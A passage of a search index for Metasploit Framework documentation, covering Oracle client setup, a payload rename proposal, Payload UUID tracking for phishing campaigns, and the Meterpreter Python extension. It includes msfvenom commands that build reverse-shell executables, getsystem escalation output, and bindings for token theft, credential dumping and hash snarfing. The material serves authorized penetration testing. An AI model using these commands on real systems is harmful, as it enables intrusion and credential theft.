    "relUrl": "/docs/using-metasploit/getting-started/nightly-installers.html#improving-these-installers"
  },"506": {
    "doc": "Nightly Installers",
    "title": "Nightly Installers",
    "content": "Installers are built nightly for macOS, Windows (64-bit) and Linux. These installers include dependencies (like Ruby and PostgreSQL) and integrate with your package manager, so they’re easy to update. ",
    "url": "/docs/using-metasploit/getting-started/nightly-installers.html",
    "relUrl": "/docs/using-metasploit/getting-started/nightly-installers.html"
  },"507": {
    "doc": "Oracle Usage",
    "title": "Install oracle InstantClient",
    "content": "InstantClient 10 is recommneded to allow you to talk with 8,9,10,&amp;11 server versions. Go to https://www.oracle.com/database/technologies/instant-client/downloads.html and select the link corresponding to your UNIX PC’s architecture. Example for Linux x64, use the Instant Client for Linux x86-64 link, which should take you to https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html . Grab these: . | Instant Client Package - Basic | Instant Client Package - SDK (devel) | Instant Client Package - SQL*Plus (not needed for Metasploit but useful to have) | . unzip into /opt/oracle . cd /opt/oracle unzip /opt/oracle/oracle-instantclient-basic-10.2.0.4-1.i386.zip unzip /opt/oracle/oracle-instantclient-sqlplus-10.2.0.4-1.i386.zip unzip /opt/oracle/oracle-instantclient-devel-10.2.0.4-1.i386.zip . Now set up a symlink so the gem installation can find the right lib: . ln -s libclntsh.so.10.1 libclntsh.so . ",
    "url": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#install-oracle-instantclient",
    "relUrl": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#install-oracle-instantclient"
  },"508": {
    "doc": "Oracle Usage",
    "title": "Set up your environment",
    "content": "You can either create .sh file to make the appropriate changes when you need it or just add it to your .bashrc . export PATH=$PATH:/opt/oracle/instantclient_10_2 export SQLPATH=/opt/oracle/instantclient_10_2 export TNS_ADMIN=/opt/oracle/instantclient_10_2 export LD_LIBRARY_PATH=/opt/oracle/instantclient_10_2 export ORACLE_HOME=/opt/oracle/instantclient_10_2 . ",
    "url": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#set-up-your-environment",
    "relUrl": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#set-up-your-environment"
  },"509": {
    "doc": "Oracle Usage",
    "title": "Additional steps for Kali Linux",
    "content": "If you are using Kali Linux, you need to perform a couple of additional steps before the Oracle client gem will build properly. First, set your path to prefer the correct version of ruby so that Metasploit can use it: . root@kali:~/ruby-oci8-ruby-oci8-2.1.8# export PATH=/opt/metasploit/ruby/bin:$PATH . Next, install libgmp (needed to build the gem): . root@kali:~/ruby-oci8-ruby-oci8-2.1.8# apt-get install libgmp-dev Reading package lists... Done Building dependency tree Reading state information... Done Suggested packages: libgmp10-doc libmpfr-dev The following NEW packages will be installed: libgmp-dev 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 0 B/610 kB of archives. After this operation, 1,740 kB of additional disk space will be used. Selecting previously unselected package libgmp-dev:amd64. (Reading database ... 322643 files and directories currently installed.) Unpacking libgmp-dev:amd64 (from .../libgmp-dev_2%3a5.0.5+dfsg-2_amd64.deb) ... Setting up libgmp-dev:amd64 (2:5.0.5+dfsg-2) ... ",
    "url": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#additional-steps-for-kali-linux",
    "relUrl": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#additional-steps-for-kali-linux"
  },"510": {
    "doc": "Oracle Usage",
    "title": "Install the gem",
    "content": "Back in your Metasploit directory, copy Gemfile.local.example to Gemfile.local, then add the following line to the :local group . gem 'ruby-oci8' . Update gems: . bundle --gemfile Gemfile.local . ",
    "url": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#install-the-gem",
    "relUrl": "/docs/using-metasploit/other/oracle-support/oracle-usage.html#install-the-gem"
  },"511": {
    "doc": "Oracle Usage",
    "title": "Oracle Usage",
    "content": " ",
    "url": "/docs/using-metasploit/other/oracle-support/oracle-usage.html",
    "relUrl": "/docs/using-metasploit/other/oracle-support/oracle-usage.html"
  },"512": {
    "doc": "Payload Rename Justification",
    "title": "Payload Rename Justification",
    "content": "The Issue . Many payloads perform the same task, yet have different names. This results in confusion and a bad new-user experience. Specifically, ARCH_CMD payloads differ greatly from their shellcode-derived brethren. For example, the most heavily used payload is windows/meterpreter/reverse_tcp; the equivalent in ARCH_CMD land is cmd/unix/reverse, which gives no indication that the session type will be a shell. The Proposal . I propose we rename all the aberrantly-named payloads to match the convention. Specifically: . | cmd/unix/bind_awk -&gt; cmd/unix/shell_bind_tcp_awk | cmd/unix/bind_lua -&gt; cmd/unix/shell_bind_tcp_lua | cmd/unix/bind_netcat -&gt; cmd/unix/shell_bind_tcp_netcat | cmd/unix/bind_netcat_gaping -&gt; cmd/unix/shell_bind_tcp_netcat_gaping | cmd/unix/bind_netcat_gaping_ipv6 -&gt; cmd/unix/shell_bind_tcp_netcat_gaping_ipv6 | cmd/unix/bind_nodejs -&gt; cmd/unix/shell_bind_tcp_nodejs | cmd/unix/bind_perl -&gt; cmd/unix/shell_bind_tcp_perl | cmd/unix/bind_perl_ipv6 -&gt; cmd/unix/shell_bind_tcp_perl_ipv6 | cmd/unix/bind_ruby -&gt; cmd/unix/shell_bind_tcp_ruby | cmd/unix/bind_ruby_ipv6 -&gt; cmd/unix/shell_bind_tcp_ruby_ipv6 | cmd/unix/bind_zsh -&gt; cmd/unix/shell_bind_tcp_zsh | cmd/unix/generic -&gt; cmd/unix/exec | cmd/unix/reverse -&gt; cmd/unix/shell_reverse_tcp_telnet | cmd/unix/reverse_awk -&gt; cmd/unix/shell_reverse_tcp_awk | cmd/unix/reverse_bash -&gt; cmd/unix/shell_reverse_tcp_bash | cmd/unix/reverse_bash_telnet_ssl -&gt; cmd/unix/shell_reverse_tcp_bash_telnet_ssl | cmd/unix/reverse_lua -&gt; cmd/unix/shell_reverse_tcp_lua | cmd/unix/reverse_netcat -&gt; cmd/unix/shell_reverse_tcp_netcat | cmd/unix/reverse_netcat_gaping -&gt; cmd/unix/shell_reverse_tcp_netcat_gaping | cmd/unix/reverse_nodejs -&gt; cmd/unix/shell_reverse_tcp_nodejs | cmd/unix/reverse_openssl -&gt; cmd/unix/shell_reverse_tcp_openssl | cmd/unix/reverse_perl -&gt; cmd/unix/shell_reverse_tcp_perl | cmd/unix/reverse_perl_ssl -&gt; cmd/unix/shell_reverse_tcp_perl_ssl | cmd/unix/reverse_php_ssl -&gt; cmd/unix/shell_reverse_tcp_php_ssl | cmd/unix/reverse_python -&gt; cmd/unix/shell_reverse_tcp_python | cmd/unix/reverse_python_ssl -&gt; cmd/unix/shell_reverse_tcp_python_ssl | cmd/unix/reverse_ruby -&gt; cmd/unix/shell_reverse_tcp_ruby | cmd/unix/reverse_ruby_ssl -&gt; cmd/unix/shell_reverse_tcp_ruby_ssl | cmd/unix/reverse_ssl_double_telnet -&gt; cmd/unix/shell_reverse_tcp_ssl_double_telnet | cmd/unix/reverse_zsh -&gt; cmd/unix/shell_reverse_tcp_zsh | cmd/windows/bind_lua -&gt; cmd/windows/shell_bind_tcp_lua | cmd/windows/bind_perl -&gt; cmd/windows/shell_bind_tcp_perl | cmd/windows/bind_perl_ipv6 -&gt; cmd/windows/shell_bind_tcp_perl_ipv6 | cmd/windows/bind_ruby -&gt; cmd/windows/shell_bind_tcp_ruby | cmd/windows/download_eval_vbs -&gt; cmd/windows/download_eval_vbs | cmd/windows/download_exec_vbs -&gt; cmd/windows/download_exec_vbs | cmd/windows/generic -&gt; cmd/windows/exec | cmd/windows/reverse_lua -&gt; cmd/windows/shell_reverse_tcp_lua | cmd/windows/reverse_perl -&gt; cmd/windows/shell_reverse_tcp_perl | cmd/windows/reverse_ruby -&gt; cmd/windows/shell_reverse_tcp_ruby | . Difficulties . Changing module names always entails a backwards compatibility issue. | Experienced users are used to the old names and may be confused and annoyed by the change. This is mitigated somewhat by the fact that these payloads are probably used less often than other architectures, and thus users will have less ingrained muscle memory for them. | It will break users’ existing RC scripts that set payloads to any of the renamed modules. | . I think consistency across platforms and architectures is more important and will result in less confusion overall. ",
    "url": "/docs/development/propsals/payload-rename-justification.html",
    "relUrl": "/docs/development/propsals/payload-rename-justification.html"
  },"513": {
    "doc": "Payload UUID",
    "title": "Payload UUID",
    "content": "In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The source code comments go into more detail. In the case of HTTP payloads, the 16-byte UUID value is encoded in base64url format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established. The goal of Payload UUIDs is three-fold: . | Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing. | Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers. | Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures. | . Specifying the UUID . Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the PayloadUUIDRaw option. This option takes a 8-byte hex string, such as “0011223344556677”. For example: . $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe . Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option: . $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe . Tracking the UUID . Payload UUIDs are enabled by default, but are not tracked unless the PayloadUUIDTracking option is set to true. Setting this option causes a new entry to be created in ~/.msf4/payloads.json when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the PayloadUUIDName. The example below will create a new registered payload with a custom name: . $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe $ cat ~/.msf4/payloads.json { \"68017d72958c40f6\": { \"arch\": \"x86\", \"platform\": \"windows\", \"timestamp\": 1435277049, \"payload\": \"payload/windows/meterpreter/reverse_https\", \"datastore\": {\"AutoLoadStdapi\":true,\"AutoRunScript\":\"\",\"AutoSystemInfo\":true,\"AutoVerifySession\":true,\"AutoVerifySessionTimeout\":30,\"EXITFUNC\":\"process\",\"EnableStageEncoding\":false,\"EnableUnicodeEncoding\":false,\"HttpUnknownRequestResponse\":\"\\u003Chtml\\u003E\\u003Cbody\\u003E\\u003Ch1\\u003EIt works!\\u003C/h1\\u003E\\u003C/body\\u003E\\u003C/html\\u003E\",\"IgnoreUnknownPayloads\":false,\"InitialAutoRunScript\":\"\",\"LHOST\":\"127.1.1.1\",\"LPORT\":4444,\"MeterpreterServerName\":\"Apache\",\"MeterpreterUserAgent\":\"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\",\"OverrideRequestHost\":false,\"PAYLOADUUIDNAME\":\"EmailCampaign20150101\",\"PayloadProxyPort\":0,\"PayloadProxyType\":\"HTTP\",\"PayloadUUIDTracking\":true,\"PrependMigrate\":false,\"ReverseListenerBindPort\":0,\"SessionCommunicationTimeout\":300,\"SessionExpirationTimeout\":604800,\"SessionRetryTotal\":3600,\"SessionRetryWait\":10,\"StageEncoderSaveRegisters\":\"\",\"StageEncodingFallback\":true,\"StagerRetryCount\":10,\"StagerURILength\":0,\"StagerVerifySSLCert\":false,\"VERBOSE\":false}, \"name\": \"EmailCampaign20150101\", \"urls\": [ \"/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi\" ] } } . Once this payload is launched, the output of the sessions -l -v command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID: . msf exploit(handler) &gt; run -j [*] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ... [*] Meterpreter session 1 opened (127.1.1.1:4444 -&gt; 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700 msf exploit(handler) &gt; sessions -l -v Active sessions =============== Session ID: 1 Type: meterpreter x86/win32 Info: fang\\hdm @ fang Tunnel: 127.1.1.1:4444 -&gt; 127.0.0.1:36235 (127.0.0.1) Via: exploit/multi/handler UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700 Registered: Yes - Name=\"EmailCampaign20150101\" . Whitelisting UUIDs . The ~/.msf4/payloads.json file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting for HTTP payloads, set the IgnoreUnknownPayloads option to true in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The payloads.json file can be copied between Metasploit Framework instances and even hand-edited while the framework is running. ",
    "url": "/docs/using-metasploit/intermediate/payload-uuid.html",
    "relUrl": "/docs/using-metasploit/intermediate/payload-uuid.html"
  },"514": {
    "doc": "Powershell Extension",
    "title": "Powershell Extension",
    "content": "I’m yet to get the documentation done for this extension, but in the mean time there’s some useful information in the original payloads pull request that shows how it can be used (including bindings). I promise to get more detail here soon! . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/powershell-extension.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/powershell-extension.html"
  },"515": {
    "doc": "Python Extension",
    "title": "Introduction",
    "content": "For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn’t really give them the ability to script the client in a single-shot. Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not all) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of ctypes for easy automation of Win32-related functions. We’ve even taken steps to make this extension piggy-back onto metsrv’s copy of the SSL libraries in an effort to reduce the size of the resulting binary. This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up. Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#introduction",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#introduction"
  },"516": {
    "doc": "Python Extension",
    "title": "Usage",
    "content": "As with any other extension that comes with Meterpreter, loading it is very simple: . meterpreter &gt; use python Loading extension python...success. Once loaded, the help system shows the commands that come with the extension: . meterpreter &gt; help ... snip ... Python Commands =============== Command Description ------- ----------- python_execute Execute a python command string python_import Import/run a python file or module python_reset Resets/restarts the Python interpreter . Each of these commands is discussed in detail below. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#usage",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#usage"
  },"517": {
    "doc": "Python Extension",
    "title": "python_execute",
    "content": "The python_execute command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the -c switch. The full help for the command is as follows: . meterpreter &gt; python_execute -h Usage: python_execute &lt;python code&gt; [-r result var name] Runs the given python string on the target. If a result is required, it should be stored in a python variable, and that variable should passed using the -r parameter. OPTIONS: -h Help banner -r &lt;opt&gt; Name of the variable containing the result (optional) . A very simple example of this command is shown below: . meterpreter &gt; python_execute \"print 'Hi, from Meterpreter!'\" [+] Content written to stdout: Hi, from Meterpreter! . Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it’s visible to the user. This also happens for anything written to stderr, as shown below: . meterpreter &gt; python_execute \"x = x + 1\" [-] Content written to stderr: Traceback (most recent call last): File \"&lt;string&gt;\", line 1, in &lt;module&gt; NameError: name 'x' is not defined . This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too. A more interesting example can be seen below: . meterpreter &gt; python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" [+] Command executed without returning a result . The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured. The good thing is that the Python extension is persistant across calls. This means that after the above command is executed, x is still present in the interpreter and can be accessed with another call: . meterpreter &gt; python_execute \"print x\" [+] Content written to stdout: [0, 5, 10, 15] . As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the -r paramter, as described by the help: . meterpreter &gt; python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" -r x [+] x = [0, 5, 10, 15] . Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the -r parameter: . meterpreter &gt; python_execute \"\" -r x [+] x = [0, 5, 10, 15] . Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the -r parameter. Sometimes, single-line execution isn’t enough, or is cumbersome. The python_import command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#python_execute",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#python_execute"
  },"518": {
    "doc": "Python Extension",
    "title": "python_import",
    "content": "This command allows for whole modules to be loaded from the attacker’s machine an uploaded to the target interpreter. The full help is shown below: . meterpreter &gt; python_import -h Usage: python_import &lt;-f file path&gt; [-n mod name] [-r result var name] Loads a python code file or module from disk into memory on the target. The module loader requires a path to a folder that contains the module, and the folder name will be used as the module name. Only .py files will work with modules. OPTIONS: -f &lt;opt&gt; Path to the file (.py, .pyc), or module directory to import -h Help banner -n &lt;opt&gt; Name of the module (optional, for single files only) -r &lt;opt&gt; Name of the variable containing the result (optional, single files only) . Importing of module trees is still considered a beta feature, but we encourage you to use it where possible and keep us informed of any issues you may face. Consider the following script: . $ cat /tmp/drives.py import string from ctypes import windll def get_drives(): drives = [] bitmask = windll.kernel32.GetLogicalDrives() for letter in string.uppercase: if bitmask &amp; 1: drives.append(letter) bitmask &gt;&gt;= 1 return drives result = get_drives() print result . The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows: . meterpreter &gt; python_import -f /tmp/drives.py [*] Importing /tmp/drives.py ... [+] Content written to stdout: ['A', 'C', 'D', 'Z'] . This shows that ctypes does indeed function correctly! . This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#python_import",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#python_import"
  },"519": {
    "doc": "Python Extension",
    "title": "python_reset",
    "content": "It may get to a point where the content of the interpreter needs to be flushed. The python_reset command clears out all imports, libraries and global variables: . meterpreter &gt; python_execute \"x = 100\" [+] Command executed without returning a result meterpreter &gt; python_execute \"print x\" [+] Content written to stdout: 100 meterpreter &gt; python_reset [+] Python interpreter successfully reset meterpreter &gt; python_execute \"print x\" [-] Content written to stderr: Traceback (most recent call last): File \"&lt;string&gt;\", line 1, in &lt;module&gt; NameError: name 'x' is not defined . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#python_reset",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#python_reset"
  },"520": {
    "doc": "Python Extension",
    "title": "Meterpreter Bindings",
    "content": "A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly. Binding list . meterpreter.elevate . | meterpreter.elevate.getsystem() - maps directly to the getsystem command, however only attempts to use technique 1 because this is the only technique that doesn’t require a binary to be uploaded. | meterpreter.elevate.rev2self() - maps directly to the rev2self command. | meterpreter.elevate.steal_token(pid) - provides the ability to steal a token from another process. | pid - the identifier of the process to steal the token from. | . | meterpreter.elevate.drop_token() - drops the token that was stolen using steal_token. | . meterpreter.extapi (requires the extapi extension) . Each of the following functions takes the following parameters: . | domain_name - the name of the domain that will be enumerated. | max_results - maximum number of results (default None). | page_size - the size of the results page (default None). | . The full list of available functions is as follows: . | meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size) - enumerate the domain controllers on the given domain. | meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size) - enumerate users on the given domain. | meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size) - enumerate users in the given group recursively. | group_dn - The distinguished name of the group to enumerate. | . | meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size) - enumerate computers on the given domain. | meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size) - provides a generic query mechanism to ADSI. All other functions in this library make use of this function. | query_filter - the LDAP-formatted query filter for the query. | fields - list of fields to extract from the query results. | . | . meterpreter.fs . | meterpreter.fs.show_mount() - maps to the show_mount command and lists all logical drives on the target. | . meterpreter.incognito (requires the incognito extension) . | meterpreter.incognito.list_user_tokens() - list all available user tokens. | meterpreter.incognito.list_group_tokens() - list all available group tokens. | meterpreter.incognito.impersonate(user) - impersonate the given user. | user - name of the user/group to impersonate in DOMAIN\\user format. | . | meterpreter.incognito.snarf_hashes(server) - run the snarf_hashes functionality using the specified server. | server - name of the server that is in place and ready to snarf the hashes. | . | meterpreter.incognito.add_user(server, username, password) - add a user to the given server. | server - name of the server to use when adding the user. | username - name of the user to create. | password - password for the new user. | . | meterpreter.incognito.add_group_user(server, group, username) - add a user to a group (domain). | server - name of the server to use when adding the user to a group. | group - name of the group to add the user to. | username - name of the user to add to the group. | . | meterpreter.incognito.add_localgroup_user(server, group, username) - add a user to a group (local). | server - name of the server to use when adding the user to a group. | group - name of the group to add the user to. | username - name of the user to add to the group. | . | . meterpreter.kiwi (requires the kiwi extension) . | meterpreter.kiwi.creds_all() - matches the creds_all command from the kiwi extension and returns a full list of all credentials that can be pulled from memory. | . meterpreter.sys . | meterpreter.sys.info() - matches the sysinfo command and shows system information. | meterpreter.sys.ps_list() - matches the ps command and lists the processes on the target. | . meterpreter.transport . | meterpreter.transport.list() - list all transports in the target. | meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash) - allows for transports to be added to the Meterpreter session. All but the url parameter come with a sane default. Full details of each of these parameters can be found in the transport documentation. | . It is not possible to delete transports using the python extension as this opens the door to many kinds of failure. meterpreter.user . | meterpreter.user.getuid() - gets the UID of the current session. | meterpreter.user.getsid() - gets the SID of the current session. | meterpreter.user.is_system() - determines if the current session is running as the SYSTEM user. | . Bindings example . meterpreter &gt; getuid Server username: WIN-TV01I7GG7JK\\oj meterpreter &gt; python_execute \"import meterpreter.user; print meterpreter.user.getuid()\" [+] Content written to stdout: WIN-TV01I7GG7JK\\oj meterpreter &gt; python_execute \"import meterpreter.elevate; meterpreter.elevate.getsystem()\" [+] Command executed without returning a result meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; python_execute \"meterpreter.elevate.rev2self(); print meterpreter.user.getuid()\" [+] Content written to stdout: WIN-TV01I7GG7JK\\oj meterpreter &gt; use incognito Loading extension incognito...success. meterpreter &gt; python_execute \"import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()\" [+] Content written to stdout: {'Delegation': ['NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\NETWORK SERVICE', 'NT AUTHORITY\\\\SYSTEM', 'WIN-TV01I7GG7JK\\\\oj'], 'Impersonation': ['NT AUTHORITY\\\\ANONYMOUS LOGON']} meterpreter &gt; python_execute \"import meterpreter.fs; print meterpreter.fs.show_mount()\" [+] Content written to stdout: [{'Name': 'A:\\\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 2}, {'Name': 'C:\\\\', 'SpaceUser': 28950585344L, 'SpaceTotal': 64422408192L, 'UNC': None, 'SpaceFree': 28950585344L, 'Type': 3}, {'Name': 'D:\\\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 5}] . Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#meterpreter-bindings",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#meterpreter-bindings"
  },"521": {
    "doc": "Python Extension",
    "title": "Stageless Initialisation",
    "content": "Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script: . $ cat /tmp/met.py import meterpreter.transport meterpreter.transport.add(\"tcp://127.0.0.1:8000\") . This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it’s possible to add any number of transports on startup. To create a stageless payload that uses this script, we can make use of the EXTINIT parameter in msfvenom: . $ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 6412437 bytes Saved as: /tmp/met-stageless.exe . When this payload is executed, the transport is added and shown to be present in the transport list immediately: . msf exploit(handler) &gt; [*] Meterpreter session 2 opened (172.16.52.1:4445 -&gt; 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000 msf exploit(handler) &gt; sessions -i -1 [*] Starting interaction with 2... meterpreter &gt; transport list Session Expiry : @ 2015-12-20 11:06:52 ID Curr URL Comms T/O Retry Total Retry Wait -- ---- --- --------- ----------- ---------- 1 tcp://127.0.0.1:8000 300 3600 10 2 * tcp://172.16.52.1:4445 300 3600 10 . This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#stageless-initialisation",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#stageless-initialisation"
  },"522": {
    "doc": "Python Extension",
    "title": "FAQ",
    "content": "Does the extension do dynamic resolution of Python libraries at runtime? . Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the python_import command. If a module doesn’t exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it’s not known when this work will get done. When will this extension be available for other Meterpreters? . We’re not yet able to put a timeline on this. Is it possible to use the Python extension to run Responder? . Unfortunately, no it is not. Responder makes the assumption that port 445 is available for use on the target, which is why it functions nicely on *nix systems that don’t make use of this port by default. On Windows systems, port 445 is already in use by system services and hence can’t be bound to. There is a Powershell-based project that aims to do the same thing as Responder, and that is called Inveigh. This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it’s recommended that this be used instead. Is it perfect? . Hell no! But the goal is to get closer and closer to perfect as we go. It’s up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks. Can I suggest a feature? . Please do, making good use of the Github issues feature. Better still, create a PR for one! . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#faq",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#faq"
  },"523": {
    "doc": "Python Extension",
    "title": "Currently Loadable Native Libraries",
    "content": "__future__ __phello__ _abcoll _osx_support _pyio _strptime _threading_local _weakrefset abc aifc antigravity argparse asynchat asyncore atexit audiodev base64 BaseHTTPServer Bastion bdb binhex bisect calendar cgi CGIHTTPServer cgitb chunk cmd code codecs codeop collections colorsys commands compileall compiler compiler.ast compiler.consts compiler.future compiler.misc compiler.pyassem compiler.pycodegen compiler.symbols compiler.syntax compiler.transformer compiler.visitor ConfigParser contextlib Cookie cookielib copy copy_reg cProfile csv ctypes ctypes._endian ctypes.util ctypes.wintypes decimal difflib dircache dis DocXMLRPCServer dummy_thread dummy_threading email email._parseaddr email.base64mime email.charset email.encoders email.errors email.feedparser email.generator email.header email.iterators email.message email.parser email.quoprimime email.utils email.mime email.mime.application email.mime.audio email.mime.base email.mime.image email.mime.message email.mime.multipart email.mime.nonmultipart email.mime.text encodings encodings.aliases encodings.ascii encodings.base64_codec encodings.charmap encodings.cp037 encodings.cp1006 encodings.cp1026 encodings.cp1140 encodings.cp1250 encodings.cp1251 encodings.cp1252 encodings.cp1253 encodings.cp1254 encodings.cp1255 encodings.cp1256 encodings.cp1257 encodings.cp1258 encodings.cp424 encodings.cp437 encodings.cp500 encodings.cp720 encodings.cp737 encodings.cp775 encodings.cp850 encodings.cp852 encodings.cp855 encodings.cp856 encodings.cp857 encodings.cp858 encodings.cp860 encodings.cp861 encodings.cp862 encodings.cp863 encodings.cp864 encodings.cp865 encodings.cp866 encodings.cp869 encodings.cp874 encodings.cp875 encodings.hex_codec encodings.hp_roman8 encodings.idna encodings.iso8859_1 encodings.iso8859_10 encodings.iso8859_11 encodings.iso8859_13 encodings.iso8859_14 encodings.iso8859_15 encodings.iso8859_16 encodings.iso8859_2 encodings.iso8859_3 encodings.iso8859_4 encodings.iso8859_5 